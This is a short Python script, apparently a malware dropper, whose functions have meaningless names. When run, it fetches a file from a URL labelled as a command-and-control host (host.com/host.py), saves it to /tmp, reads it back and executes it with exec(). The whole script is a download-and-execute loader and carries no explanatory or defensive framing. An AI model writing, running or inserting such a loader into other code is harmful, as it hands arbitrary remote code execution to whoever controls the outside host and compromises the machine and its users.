import requests
import os

def f1(u):
    r = requests.get(u)
    return r.text

def f2(fp, c):
    with open(fp, "w") as f:
        f.write(c)

def f3(fp):
    with open(fp, "r") as f:
        return f.read()

def f4(s):
    exec(s)

def f5(u, fp):
    cd = f1(u)
    f2(fp, cd)
    sc = f3(fp)
    f4(sc)

def main():
    c2_host_url = "http://host.com/host.py"
    tmp_file = "/tmp/host.py"
    f5(c2_host_url, tmp_file)

main()
